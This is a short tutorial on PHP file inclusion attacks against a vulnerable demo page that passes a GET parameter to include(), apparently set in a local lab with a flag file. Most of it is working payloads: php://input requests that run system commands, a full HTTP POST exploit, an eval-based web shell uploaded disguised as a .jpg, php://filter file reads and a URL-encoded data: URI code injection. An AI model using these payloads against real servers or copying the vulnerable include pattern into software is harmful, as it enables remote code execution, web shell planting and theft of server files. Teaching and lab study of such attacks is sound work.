## Summary of some common methods of file include attack.

File inclusion attacks are presented in server-side code in the form of:

```php+HTML
/*demo.php*/
<?php
    include($_GET['action']);
?>

```

Here are a few ways to use it.

### 1.Exploition of  php://input protocol

You can use the PHP pseudo-protocol php://input, often using the POST argument to take exploit it.

###### The GET parameter：

```http
/?action=php://input
```

###### The Post parameter

```php+HTML
<?php system("dir"); ?>
```

###### or

```php+HTML
<?php echo file_get_contents("../../flag.txt");?>
```

###### The full utilization payload is as follows

```http
POST /labs/IncludeAttack/demo.php/?action=php://input HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

<?php echo file_get_contents("../../flag.txt");?>
```

Where, statements

```php+HTML
file_get_contents('php://input');
```

The argument string itself used to echo any POST.

#### 2.Cooperate with upload attack

Among the file upload vulnerabilities, we have the Trojan virus:

```php
/*virus.php*/
<?php
    eval($_POST['pwd']);
?>
```

Change its suffix to .jpg post-upload, now in the target server we have a executable virus.

We can construct payload;

###### The GET&POST parameter

```http
/?action=virus.jpg
```

```php
pwd=system("dir");
// or pwd=system("ls -la");
// or pwd= echo file_get_contents("../../flag.txt");
```

#### 3.Explotion of php://filter

###### The GET parameter

```http
php://filter/read=convert.base64-encode/resource=../../flag.txt
```

 The echo is the base64 encryption form of the document.

#### 4.Any executable codes injection

We inject the byte stream of the PHP code we want to execute directly into the GET parameter, replacing the punctuation with %ord(byte).

###### The GET parameter

```http
// data: text/plain,<?php system("dir");?>
/?action=data%3a+text/plain,<%3fphp+system+%28"dir"%29%3b+%3f>
```

